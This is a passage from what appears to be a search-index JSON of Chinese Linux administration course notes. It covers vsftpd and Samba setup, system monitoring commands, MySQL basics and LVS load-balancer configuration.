userlist_deny=YES # \u65e5\u5fd7\u8bb0\u5f55 # \u4e0a\u4f20\u548c\u4e0b\u8f7d\u8bb0\u5f55 xferlog_enable=YES xferlog_file=/var/log/xferlog # \u670d\u52a1\u5668\u4f20\u8f93\u60c5\u51b5\u8bb0\u5f55 dual_log_enable=YES vsftpd_log_file=/var/log/vsftpd.log \u6bcf\u6b21\u4fee\u6539\u914d\u7f6e\u540e\u90fd\u8981\u91cd\u542f\u670d\u52a1\u751f\u6548\u3002 vsftpd\u540c\u65f6\u76d1\u542cipv4\u548cipv6\uff1a # \u4f7f\u7528\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6 $ sudo cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd_ipv6.conf # \u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\u5206\u522b\u8bbe\u7f6elisten=YES\u548clisten_ipv6=YES # \u542f\u52a8\u670d\u52a1 $ sudo systemctl start vsftpd.target FTP\u547d\u4ee4\uff1a # \u4e0b\u8f7d\u5355\u4e2a\u6587\u4ef6 ftp> get test.txt # \u591a\u6587\u4ef6\u4e0b\u8f7d ftp> mget *.txt # \u4e0b\u8f7d\u65f6\u4e0d\u63d0\u793a\u786e\u8ba4\uff08\u5728\u4e0b\u8f7d\u524d\u6267\u884c\uff09 ftp> prompt off # \u4e0a\u4f20\u6587\u4ef6 ftp> put upload.txt # \u6267\u884cShell\u547d\u4ee4\uff08\u524d\u9762\u52a0!\uff09 ftp> !ls \u865a\u62df\u7528\u6237\u914d\u7f6e\uff1a # \u521b\u5efa\u8bbf\u5ba2\u7528\u6237 $ sudo useradd -d /home/ftp_vuser -s /sbin/nologin ftp_vuser # \u8bbe\u7f6e\u8bbf\u5ba2\u5bb6\u76ee\u5f55\u6743\u9650 $ sudo chmod o+x /home/ftp_vuser # \u751f\u6210\u865a\u62df\u7528\u6237\u53e3\u4ee4 $ sudo tee /etc/vsftpd/vuser.txt << EOF lou loupass linux linuxpass EOF # \u751f\u6210\u8ba4\u8bc1\u6587\u4ef6 $ sudo db_load -T -t hash -f /etc/vsftpd/vuser.txt /etc/vsftpd/vuser.db # \u4fee\u6539db\u6743\u9650 $ sudo chmod 600 /etc/vsftpd/vuser.db # \u6dfb\u52a0\u8ba4\u8bc1 $ sudo tee /etc/pam.d/vsftpd.virtual << EOF auth required pam_userdb.so db=/etc/vsftpd/vuser account required pam_userdb.so db=/etc/vsftpd/vuser EOF # \u5728vsftpd.conf\u4e2d\u6307\u5b9apam\u8ba4\u8bc1\u6587\u4ef6 $ echo pam_service_name=vsftpd.virtual | sudo tee -a /etc/vsftpd/vsftpd.conf \u9650\u5236\u5b9e\u4f53\u7528\u6237\u767b\u5f55FTP\uff1a /etc/vsftpd/ftpusers \u7981\u6b62\u7528\u6237\u767b\u5f55 /etc/vsftpd/user_list \u8bbe\u7f6e\u7528\u6237\u662f\u5426\u80fd\u767b\u5f55\uff08\u9700\u5728vsftpd.conf\u4e2d\u914d\u7f6e\uff09 ftpusers\u7684\u4f18\u5148\u7ea7\u6bd4user_list\u9ad8 \u5e38\u89c1\u62a5\u9519\uff1a 500 OOPS: run two copies of vsftpd for IPv4 and IPv6 \u5728\u540c\u4e00\u4e2avsftpd\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u540c\u65f6\u8bbe\u7f6e\u4e86 listen=YES \u548c listen_ipv6=YES ftp:connect to address ::1: connection refused \u6ce8\u91ca\u6389/etc/hosts\u6587\u4ef6\u4e2d ::1 \u5f00\u5934\u7684\u884c\u5373\u53ef permission denied \u6ca1\u6709\u76f8\u5e94\u7684FTP\u6743\u9650\uff1b\u4e0b\u8f7d\u7684\u76ee\u5f55\u6ca1\u6709\u6743\u9650 530 this ftp server is anonymous only vsftpd\u9ed8\u8ba4\u4e0d\u5141\u8bb8\u672c\u5730\u7528\u6237\u767b\u5f55\u3002\u914d\u7f6e local_enable=YES 500 oops and 421 service vsftpd\u9ed8\u8ba4\u6839\u76ee\u5f55\u4e0d\u53ef\u5199\u3002\u914d\u7f6e allow_writeable_chroot=YES 226 transfer done(but fail to open directory) \u865a\u62df\u5e10\u53f7\u6ca1\u6709\u8bbf\u5ba2\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u8bbf\u95ee\u6743\u9650\u3002 $ sudo chmod o+x /home/<guest\u7528\u6237> FTP\u6570\u5b57\u72b6\u6001\uff1a 220 \u5df2\u5c31\u7eea 331 \u9700\u8981\u8f93\u5165\u5bc6\u7801 230 \u5df2\u767b\u5165 227 \u88ab\u52a8\u6a21\u5f0f 159 \u6587\u4ef6\u72b6\u6001\u6b63\u786e\uff0c\u6b63\u5728\u6253\u5f00\u6570\u636e\u8fde\u63a5 226 \u6b63\u5728\u5173\u95ed\u6570\u636e\u8fde\u63a5\uff0c\u8bf7\u6c42\u6587\u4ef6\u52a8\u4f5c\u6210\u529f\u7ed3\u675f 221 \u5173\u95ed\u8fde\u63a5","title":"Linux FTP \u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e"},{"location":"week04/Linux_Samba\u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e/","text":"samba\u914d\u7f6e\u6587\u4ef6\uff1a /etc/samba/smb.conf \uff0c\u5177\u4f53\u914d\u7f6e\u53c2\u6570\u53ef\u53c2\u8003\uff1a /etc/samba/smb.conf.example \u53ef\u4ee5\u901a\u8fc7 testparm \u547d\u4ee4\u6d4b\u8bd5samba\u670d\u52a1\u7684\u914d\u7f6e\u60c5\u51b5 pdbedit \u547d\u4ee4\u53ef\u4ee5\u7ba1\u7406samba\u7528\u6237\u6570\u636e\u5e93 -L \u5217\u51fa\u5f53\u524d\u7528\u6237\u6570\u636e\u5217\u8868 -v \u8be6\u7ec6\u6a21\u5f0f -u \u7528\u6237\u540d -a \u521b\u5efa\u7528\u6237 -x \u5220\u9664\u7528\u6237 \u9700\u8981\u5173\u95edSELinux\uff0c\u5426\u5219\u65e0\u6cd5\u770b\u5230\u5171\u4eab\u76ee\u5f55\u7684\u5185\u5bb9\u3002","title":"Linux Samba \u670d\u52a1\u90e8\u7f72\u4e0e\u914d\u7f6e"},{"location":"week06/Linux\u7cfb\u7edf\u76d1\u63a7\u5e38\u7528\u547d\u4ee4/","text":"Linux\u7cfb\u7edf\u76d1\u63a7\u5e38\u7528\u547d\u4ee4 free \u547d\u4ee4\u663e\u793a\u7cfb\u7edf\u4f7f\u7528\u548c\u7a7a\u95f2\u7684\u5185\u5b58\u60c5\u51b5\u3002 -/+ buffers/cache \u8868\u793a\u5b9e\u9645\u5360\u7528\u5185\u5b58\u548c\u53ef\u5206\u914d\u5185\u5b58 -m \u4ee5MB\u4e3a\u5355\u4f4d\u663e\u793a -t \u663e\u793a\u6c47\u603b\u4fe1\u606f \u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f\uff1a # \u663e\u793a\u6b64\u6b21\u767b\u5f55shell\u4fe1\u606f $ ps -l # \u663e\u793a\u6240\u6709\u8fdb\u7a0b\u4fe1\u606f $ ps aux $ ps -ef # \u663e\u793a\u8fdb\u7a0b\u6811 $ pstree # \u663e\u793a\u8fdb\u7a0b\u6811\uff0c\u8fdb\u7a0b\u53f7\u548c\u8fdb\u7a0bid $ pstree -p CPU\u76d1\u63a7\uff1a top \uff0c htop netstat \uff1a -r \u663e\u793a\u8def\u7531\u8868 -i \u663e\u793a\u7f51\u5361\u5217\u8868 -s \u663e\u793a\u6bcf\u4e2a\u534f\u8bae\u7684\u7edf\u8ba1\u4fe1\u606f tcpdump \uff1a -i \u6307\u5b9a\u7f51\u7edc\u63a5\u53e3 -c \u53ea\u6293\u53d6\u6307\u5b9a\u6570\u91cf\u7684\u6570\u636e\u5305 iftop \u5b9e\u65f6\u6d41\u91cf\u76d1\u63a7\u5de5\u5177 traceroute \u8ffd\u8e2a\u6570\u636e\u5305\u5728\u7f51\u7edc\u4e0a\u7684\u4f20\u8f93\u8def\u5f84 -m \u8bbe\u7f6e\u8df3\u6570 -n \u4e0d\u67e5\u4e3b\u673a\u540d -q \u8bbe\u7f6e\u63a2\u6d4b\u5305\u4e2a\u6570 mtr \u662f\u5224\u65ad\u7f51\u7edc\u8fde\u901a\u6027\u7684\u5de5\u5177 -r \u62a5\u544a\u6a21\u5f0f -c \u6bcf\u79d2\u53d1\u9001\u6570\u636e\u5305\u7684\u6570\u91cf -s \u8bbe\u7f6eping\u5305\u5927\u5c0f vmstat \u53ef\u4ee5\u663e\u793a\u78c1\u76d8\u3001\u5185\u5b58\u7b49\u4fe1\u606f\uff1a # \u6bcf2\u79d2\u663e\u793a\u4e00\u6b21\u7cfb\u7edf\u5185\u5b58\u7684\u7edf\u8ba1\u4fe1\u606f $ vmstat 2 # \u6bcf2\u79d2\u663e\u793a\u4e00\u6b21\u7cfb\u7edf\u5185\u5b58\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u603b\u8ba13\u6b21 $ vmstat 2 3 \u67e5\u770b\u78c1\u76d8\u7a7a\u95f4\uff1a df \u78c1\u76d8IO\u76d1\u63a7\uff1a iotop","title":"Linux \u7cfb\u7edf\u76d1\u63a7\u5e38\u7528\u547d\u4ee4"},{"location":"week06/Linux\u7cfb\u7edf\u76d1\u63a7\u5e38\u7528\u547d\u4ee4/#linux","text":"free \u547d\u4ee4\u663e\u793a\u7cfb\u7edf\u4f7f\u7528\u548c\u7a7a\u95f2\u7684\u5185\u5b58\u60c5\u51b5\u3002 -/+ buffers/cache \u8868\u793a\u5b9e\u9645\u5360\u7528\u5185\u5b58\u548c\u53ef\u5206\u914d\u5185\u5b58 -m \u4ee5MB\u4e3a\u5355\u4f4d\u663e\u793a -t \u663e\u793a\u6c47\u603b\u4fe1\u606f \u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f\uff1a # \u663e\u793a\u6b64\u6b21\u767b\u5f55shell\u4fe1\u606f $ ps -l # \u663e\u793a\u6240\u6709\u8fdb\u7a0b\u4fe1\u606f $ ps aux $ ps -ef # \u663e\u793a\u8fdb\u7a0b\u6811 $ pstree # \u663e\u793a\u8fdb\u7a0b\u6811\uff0c\u8fdb\u7a0b\u53f7\u548c\u8fdb\u7a0bid $ pstree -p CPU\u76d1\u63a7\uff1a top \uff0c htop netstat \uff1a -r \u663e\u793a\u8def\u7531\u8868 -i \u663e\u793a\u7f51\u5361\u5217\u8868 -s \u663e\u793a\u6bcf\u4e2a\u534f\u8bae\u7684\u7edf\u8ba1\u4fe1\u606f tcpdump \uff1a -i \u6307\u5b9a\u7f51\u7edc\u63a5\u53e3 -c \u53ea\u6293\u53d6\u6307\u5b9a\u6570\u91cf\u7684\u6570\u636e\u5305 iftop \u5b9e\u65f6\u6d41\u91cf\u76d1\u63a7\u5de5\u5177 traceroute \u8ffd\u8e2a\u6570\u636e\u5305\u5728\u7f51\u7edc\u4e0a\u7684\u4f20\u8f93\u8def\u5f84 -m \u8bbe\u7f6e\u8df3\u6570 -n \u4e0d\u67e5\u4e3b\u673a\u540d -q \u8bbe\u7f6e\u63a2\u6d4b\u5305\u4e2a\u6570 mtr \u662f\u5224\u65ad\u7f51\u7edc\u8fde\u901a\u6027\u7684\u5de5\u5177 -r \u62a5\u544a\u6a21\u5f0f -c \u6bcf\u79d2\u53d1\u9001\u6570\u636e\u5305\u7684\u6570\u91cf -s \u8bbe\u7f6eping\u5305\u5927\u5c0f vmstat \u53ef\u4ee5\u663e\u793a\u78c1\u76d8\u3001\u5185\u5b58\u7b49\u4fe1\u606f\uff1a # \u6bcf2\u79d2\u663e\u793a\u4e00\u6b21\u7cfb\u7edf\u5185\u5b58\u7684\u7edf\u8ba1\u4fe1\u606f $ vmstat 2 # \u6bcf2\u79d2\u663e\u793a\u4e00\u6b21\u7cfb\u7edf\u5185\u5b58\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u603b\u8ba13\u6b21 $ vmstat 2 3 \u67e5\u770b\u78c1\u76d8\u7a7a\u95f4\uff1a df \u78c1\u76d8IO\u76d1\u63a7\uff1a iotop","title":"Linux\u7cfb\u7edf\u76d1\u63a7\u5e38\u7528\u547d\u4ee4"},{"location":"week07/MySQL\u8bed\u8a00\u7ed3\u6784\u548c\u6570\u636e\u7c7b\u578b/","text":"MySQL\u8bed\u8a00\u7ed3\u6784\u548c\u6570\u636e\u7c7b\u578b CHAR \u4e3a\u56fa\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32\uff0c\u957f\u5ea6\uff1a0\\~255\uff1b VARCHAR \u4e3a\u53d8\u957f\u5b57\u7b26\u4e32\uff0c\u957f\u5ea6\uff1a0\\~65535\uff1b\u82e5\u8d85\u51fa\u957f\u5ea6\u5219\u4f1a\u4e22\u5931\u8d85\u51fa\u7684\u90e8\u5206\u3002 TEXT \u4e0d\u9700\u8981\u6307\u5b9a\u957f\u5ea6\uff1b BLOB \u7528\u6765\u4fdd\u5b58\u4e8c\u8fdb\u5236\u6570\u636e\u3002 ENUM \u662f\u679a\u4e3e\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u53d665535\u4e2a\u4e0d\u540c\u7684\u503c\uff0c\u4e00\u6761\u8bb0\u5f55\u53ea\u80fd\u53d6\u4e00\u4e2a\u503c\uff1b SET \u662f\u96c6\u5408\uff0c\u6700\u591a\u53ea\u80fd\u670964\u4e2a\u503c\uff0c\u4f46\u4e00\u6761\u8bb0\u5f55\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u7528 , \u5206\u9694\u3002 DECIMAL \u53ef\u4ee5\u6307\u5b9a\u6574\u6570\u548c\u5c0f\u6570\u90e8\u5206\u7684\u4f4d\u6570\uff1a DECIMAL(\u6574\u6570\u4f4d\u6570, \u5c0f\u6570\u4f4d\u6570) \u3002 DATE , TIME , DATETIME \uff1a\u65e5\u671f\uff0c\u65f6\u95f4\uff0c\u65e5\u671f\u4e0e\u65f6\u95f4 \u6570\u636e\u5e93\u540d\u6216\u8868\u540d\u53ef\u4ee5\u4f7f\u7528MySQL\u5173\u952e\u5b57\uff0c\u4f46\u8981\u52a0\u53cd\u5f15\u53f7\u3002 \u6ce8\u91ca\uff1a \u4ee5 # \u5230\u884c\u5c3e \u4ee5 -- \u5230\u884c\u5c3e \u591a\u884c\u6ce8\u91ca: /* \u6ce8\u91ca */","title":"MySQL \u8bed\u8a00\u7ed3\u6784\u548c\u6570\u636e\u7c7b\u578b"},{"location":"week07/MySQL\u8bed\u8a00\u7ed3\u6784\u548c\u6570\u636e\u7c7b\u578b/#mysql","text":"CHAR \u4e3a\u56fa\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32\uff0c\u957f\u5ea6\uff1a0\\~255\uff1b VARCHAR \u4e3a\u53d8\u957f\u5b57\u7b26\u4e32\uff0c\u957f\u5ea6\uff1a0\\~65535\uff1b\u82e5\u8d85\u51fa\u957f\u5ea6\u5219\u4f1a\u4e22\u5931\u8d85\u51fa\u7684\u90e8\u5206\u3002 TEXT \u4e0d\u9700\u8981\u6307\u5b9a\u957f\u5ea6\uff1b BLOB \u7528\u6765\u4fdd\u5b58\u4e8c\u8fdb\u5236\u6570\u636e\u3002 ENUM \u662f\u679a\u4e3e\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u53d665535\u4e2a\u4e0d\u540c\u7684\u503c\uff0c\u4e00\u6761\u8bb0\u5f55\u53ea\u80fd\u53d6\u4e00\u4e2a\u503c\uff1b SET \u662f\u96c6\u5408\uff0c\u6700\u591a\u53ea\u80fd\u670964\u4e2a\u503c\uff0c\u4f46\u4e00\u6761\u8bb0\u5f55\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u7528 , \u5206\u9694\u3002 DECIMAL \u53ef\u4ee5\u6307\u5b9a\u6574\u6570\u548c\u5c0f\u6570\u90e8\u5206\u7684\u4f4d\u6570\uff1a DECIMAL(\u6574\u6570\u4f4d\u6570, \u5c0f\u6570\u4f4d\u6570) \u3002 DATE , TIME , DATETIME \uff1a\u65e5\u671f\uff0c\u65f6\u95f4\uff0c\u65e5\u671f\u4e0e\u65f6\u95f4 \u6570\u636e\u5e93\u540d\u6216\u8868\u540d\u53ef\u4ee5\u4f7f\u7528MySQL\u5173\u952e\u5b57\uff0c\u4f46\u8981\u52a0\u53cd\u5f15\u53f7\u3002 \u6ce8\u91ca\uff1a \u4ee5 # \u5230\u884c\u5c3e \u4ee5 -- \u5230\u884c\u5c3e \u591a\u884c\u6ce8\u91ca: /* \u6ce8\u91ca */","title":"MySQL\u8bed\u8a00\u7ed3\u6784\u548c\u6570\u636e\u7c7b\u578b"},{"location":"week07/SQL\u4e0eMYSQL/","text":"SQL\u4e0eMYSQL \u67e5\u770bmysqld\u548cmysql\u7684\u6240\u6709\u53ef\u914d\u7f6e\u9879\uff1a $ mysqld --verbose --help $ mysql --help \u914d\u7f6e\u6587\u4ef6\uff1a /etc/mysql/my.cnf \uff0c\u4e0e\u6240\u6709\u53ef\u914d\u7f6e\u9879\u5bf9\u5e94\u3002 \u5728mysql\u4e2d\u53ef\u4ee5\u4f7f\u7528 SET \u547d\u4ee4\u6765\u4e34\u65f6\u4fee\u6539\u914d\u7f6e\u3002","title":"SQL \u4e0e MYSQL"},{"location":"week07/SQL\u4e0eMYSQL/#sqlmysql","text":"\u67e5\u770bmysqld\u548cmysql\u7684\u6240\u6709\u53ef\u914d\u7f6e\u9879\uff1a $ mysqld --verbose --help $ mysql --help \u914d\u7f6e\u6587\u4ef6\uff1a /etc/mysql/my.cnf \uff0c\u4e0e\u6240\u6709\u53ef\u914d\u7f6e\u9879\u5bf9\u5e94\u3002 \u5728mysql\u4e2d\u53ef\u4ee5\u4f7f\u7528 SET \u547d\u4ee4\u6765\u4e34\u65f6\u4fee\u6539\u914d\u7f6e\u3002","title":"SQL\u4e0eMYSQL"},{"location":"week07/\u6570\u636e\u5e93\u7684\u7b80\u5355\u64cd\u4f5c/","text":"\u6570\u636e\u5e93\u7684\u7b80\u5355\u64cd\u4f5c /* \u67e5\u770b\u6570\u636e\u5e93 */ SHOW DATABASES; /* \u521b\u5efa\u6570\u636e\u5e93 */ CREATE DATABASE db_name; /* \u67e5\u770b\u521b\u5efa\u8bed\u53e5 */ SHOW CREATE DATABASE db_name; /* \u4fee\u6539\u6570\u636e\u5e93\u5b57\u7b26\u96c6\u4e3autf8 */ ALTER DATABASE db_name CHARACTER SET = utf8; /* \u5220\u9664\u6570\u636e\u5e93 */ DROP DATABASE db_name; /* \u9009\u62e9\u4f7f\u7528\u6570\u636e\u5e93 */ USE db_name /* \u67e5\u770b\u5f53\u524d\u9009\u62e9\u7684\u6570\u636e\u5e93 */ SELECT DATABASE();","title":"\u6570\u636e\u5e93\u7684\u7b80\u5355\u64cd\u4f5c"},{"location":"week07/\u6570\u636e\u5e93\u7684\u7b80\u5355\u64cd\u4f5c/#_1","text":"/* \u67e5\u770b\u6570\u636e\u5e93 */ SHOW DATABASES; /* \u521b\u5efa\u6570\u636e\u5e93 */ CREATE DATABASE db_name; /* \u67e5\u770b\u521b\u5efa\u8bed\u53e5 */ SHOW CREATE DATABASE db_name; /* \u4fee\u6539\u6570\u636e\u5e93\u5b57\u7b26\u96c6\u4e3autf8 */ ALTER DATABASE db_name CHARACTER SET = utf8; /* \u5220\u9664\u6570\u636e\u5e93 */ DROP DATABASE db_name; /* \u9009\u62e9\u4f7f\u7528\u6570\u636e\u5e93 */ USE db_name /* \u67e5\u770b\u5f53\u524d\u9009\u62e9\u7684\u6570\u636e\u5e93 */ SELECT DATABASE();","title":"\u6570\u636e\u5e93\u7684\u7b80\u5355\u64cd\u4f5c"},{"location":"week08/LVS\u5b9e\u6218/","text":"LVS\u5b9e\u6218 \u96c6\u7fa4\u7cfb\u7edf\u4e2d\uff0c\u670d\u52a1\u5668\u8d44\u6e90\u53ef\u5206\u4e3a\u8d1f\u8f7d\u5747\u8861\u8c03\u5ea6\u5668(Load Balancer)\u548c\u540e\u7aef\u670d\u52a1\u5668\u7fa4\u3002 LVS/NAT Load Balancer\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff1a 1\u3001\u5b89\u88c5 ipvsadm 2\u3001\u5f00\u542f\u5185\u6838\u8def\u7531\u8f6c\u53d1 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward 3\u3001\u914d\u7f6eipvs\u89c4\u5219\uff0c\u5b9a\u4e49\u96c6\u7fa4\u670d\u52a1\uff1a # \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\u670d\u52a1 sudo ipvsadm -A -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -s <\u8c03\u5ea6\u7b97\u6cd5> # \u6dfb\u52a0\u4e00\u4e2a\u96c6\u7fa4\u89c4\u5219 sudo ipvsadm -a -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -r <\u540e\u7aef\u670d\u52a1\u5668\u5185\u7f51IP> -m \u9009\u9879\u8bf4\u660e\uff1a -A \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\u670d\u52a1 -t \u4f7f\u7528TCP\u534f\u8bae -s \u6307\u5b9a\u8d1f\u8f7d\u5747\u8861\u8c03\u5ea6\u7b97\u6cd5\uff0cLVS\u5b9e\u73b0\u4e868\u79cd\u8c03\u5ea6\u7b97\u6cd5\uff0c\u5982 rr \uff08\u8f6e\u8be2\u7b97\u6cd5\uff09\u7b49\u3002 -a \u6dfb\u52a0\u4e00\u4e2a\u96c6\u7fa4\u89c4\u5219 -r \u6307\u5b9a\u540e\u7aef\u670d\u52a1\u5668\u5185\u7f51IP -m \u5b9a\u4e49\u4e3aNAT LVS/DR \u540e\u7aef\u670d\u52a1\u5668\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff1a 1\u3001\u4fee\u6539\u5185\u6838\u53c2\u6570\uff1a echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce # \u4f7f\u4e0a\u8ff0\u914d\u7f6e\u7acb\u5373\u751f\u6548 sysctl -p arp_ignore \u53c2\u6570\u5b9a\u4e49\u4e86\u672c\u673a\u54cd\u5e94ARP\u8bf7\u6c42\u7684\u7ea7\u522b\uff0c\u542b\u4e49\uff1a 0 \uff08\u9ed8\u8ba4\uff09\u76ee\u6807IP\u4e3a\u672c\u673a\u5219\u54cd\u5e94ARP\u8bf7\u6c42 1 \u63a5\u6536ARP\u8bf7\u6c42\u7684\u7f51\u5361IP\u548c\u76ee\u6807IP\u76f8\u540c\uff0c\u5219\u54cd\u5e94ARP\u8bf7\u6c42 arp_announce \u53c2\u6570\u5b9a\u4e49\u4e86\u53d1\u9001ARP\u8bf7\u6c42\u65f6\uff0c\u6e90IP\u5e94\u8be5\u586b\u4ec0\u4e48\uff0c\u542b\u4e49\uff1a 0 \uff08\u9ed8\u8ba4\uff09\u4f7f\u7528\u4efb\u4e00\u7f51\u7edc\u63a5\u53e3\u4e0a\u914d\u7f6e\u7684\u672c\u5730IP\u5730\u5740 2 \u5ffd\u7565IP\u6570\u636e\u5305\u7684\u6e90IP\u5730\u5740\uff0c\u603b\u662f\u9009\u62e9\u7f51\u7edc\u63a5\u53e3\u6240\u914d\u7f6e\u7684\u6700\u5408\u9002\u7684IP\u5730\u5740\u4f5c\u4e3aARP\u8bf7\u6c42\u6570\u636e\u5305\u7684\u6e90IP\u5730\u5740 2\u3001\u914d\u7f6e\u7f51\u5361\u522b\u540d\uff1a # \u914d\u7f6e\u865a\u62dfIP ifconfig lo:0 192.168.0.10 broadcast 192.168.0.10 netmask 255.255.255.255 up # \u6dfb\u52a0\u8def\u7531\uff0c\u56e0\u4e3a\u672c\u5c31\u662f\u76f8\u540c\u7684\u7f51\u6bb5\u6240\u4ee5\u53ef\u4ee5\u4e0d\u6dfb\u52a0\u8be5\u8def\u7531 route add -host 192.168.0.10 dev lo:0 # \u91cd\u65b0\u52a0\u8f7d\u7f51\u5361 service networking restart Load Balancer\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff1a 1\u3001\u5b89\u88c5 ipvsadm 2\u3001\u521b\u5efaeth0\u7684\u522b\u540d\u5e76\u7ed1\u5b9a\u5bf9\u5916IP\uff0c\u4f5c\u4e3a\u96c6\u7fa4\u540c\u65f6\u4f7f\u7528\uff1a ifconfig eth0:0 192.168.0.10 netmask 255.255.255.0 up 3\u3001\u914d\u7f6eipvs\u89c4\u5219\uff1a # \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\u670d\u52a1 sudo ipvsadm -A -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -s <\u8c03\u5ea6\u7b97\u6cd5> # \u6dfb\u52a0\u4e00\u4e2a\u96c6\u7fa4\u89c4\u5219 sudo ipvsadm -a -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -r <\u540e\u7aef\u670d\u52a1\u5668\u5185\u7f51IP> -g -g \u5b9a\u4e49\u4e3aDR\u6a21\u5f0f","title":"LVS \u5b9e\u6218"},{"location":"week08/LVS\u5b9e\u6218/#lvs","text":"\u96c6\u7fa4\u7cfb\u7edf\u4e2d\uff0c\u670d\u52a1\u5668\u8d44\u6e90\u53ef\u5206\u4e3a\u8d1f\u8f7d\u5747\u8861\u8c03\u5ea6\u5668(Load Balancer)\u548c\u540e\u7aef\u670d\u52a1\u5668\u7fa4\u3002","title":"LVS\u5b9e\u6218"},{"location":"week08/LVS\u5b9e\u6218/#lvsnat","text":"Load Balancer\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff1a 1\u3001\u5b89\u88c5 ipvsadm 2\u3001\u5f00\u542f\u5185\u6838\u8def\u7531\u8f6c\u53d1 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward 3\u3001\u914d\u7f6eipvs\u89c4\u5219\uff0c\u5b9a\u4e49\u96c6\u7fa4\u670d\u52a1\uff1a # \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\u670d\u52a1 sudo ipvsadm -A -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -s <\u8c03\u5ea6\u7b97\u6cd5> # \u6dfb\u52a0\u4e00\u4e2a\u96c6\u7fa4\u89c4\u5219 sudo ipvsadm -a -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -r <\u540e\u7aef\u670d\u52a1\u5668\u5185\u7f51IP> -m \u9009\u9879\u8bf4\u660e\uff1a -A \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\u670d\u52a1 -t \u4f7f\u7528TCP\u534f\u8bae -s \u6307\u5b9a\u8d1f\u8f7d\u5747\u8861\u8c03\u5ea6\u7b97\u6cd5\uff0cLVS\u5b9e\u73b0\u4e868\u79cd\u8c03\u5ea6\u7b97\u6cd5\uff0c\u5982 rr \uff08\u8f6e\u8be2\u7b97\u6cd5\uff09\u7b49\u3002 -a \u6dfb\u52a0\u4e00\u4e2a\u96c6\u7fa4\u89c4\u5219 -r \u6307\u5b9a\u540e\u7aef\u670d\u52a1\u5668\u5185\u7f51IP -m \u5b9a\u4e49\u4e3aNAT","title":"LVS/NAT"},{"location":"week08/LVS\u5b9e\u6218/#lvsdr","text":"\u540e\u7aef\u670d\u52a1\u5668\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff1a 1\u3001\u4fee\u6539\u5185\u6838\u53c2\u6570\uff1a echo 1 > /proc/sys/net/ipv4/conf/lo/arp_ignore echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore echo 2 > /proc/sys/net/ipv4/conf/lo/arp_announce echo 2 > /proc/sys/net/ipv4/conf/all/arp_announce # \u4f7f\u4e0a\u8ff0\u914d\u7f6e\u7acb\u5373\u751f\u6548 sysctl -p arp_ignore \u53c2\u6570\u5b9a\u4e49\u4e86\u672c\u673a\u54cd\u5e94ARP\u8bf7\u6c42\u7684\u7ea7\u522b\uff0c\u542b\u4e49\uff1a 0 \uff08\u9ed8\u8ba4\uff09\u76ee\u6807IP\u4e3a\u672c\u673a\u5219\u54cd\u5e94ARP\u8bf7\u6c42 1 \u63a5\u6536ARP\u8bf7\u6c42\u7684\u7f51\u5361IP\u548c\u76ee\u6807IP\u76f8\u540c\uff0c\u5219\u54cd\u5e94ARP\u8bf7\u6c42 arp_announce \u53c2\u6570\u5b9a\u4e49\u4e86\u53d1\u9001ARP\u8bf7\u6c42\u65f6\uff0c\u6e90IP\u5e94\u8be5\u586b\u4ec0\u4e48\uff0c\u542b\u4e49\uff1a 0 \uff08\u9ed8\u8ba4\uff09\u4f7f\u7528\u4efb\u4e00\u7f51\u7edc\u63a5\u53e3\u4e0a\u914d\u7f6e\u7684\u672c\u5730IP\u5730\u5740 2 \u5ffd\u7565IP\u6570\u636e\u5305\u7684\u6e90IP\u5730\u5740\uff0c\u603b\u662f\u9009\u62e9\u7f51\u7edc\u63a5\u53e3\u6240\u914d\u7f6e\u7684\u6700\u5408\u9002\u7684IP\u5730\u5740\u4f5c\u4e3aARP\u8bf7\u6c42\u6570\u636e\u5305\u7684\u6e90IP\u5730\u5740 2\u3001\u914d\u7f6e\u7f51\u5361\u522b\u540d\uff1a # \u914d\u7f6e\u865a\u62dfIP ifconfig lo:0 192.168.0.10 broadcast 192.168.0.10 netmask 255.255.255.255 up # 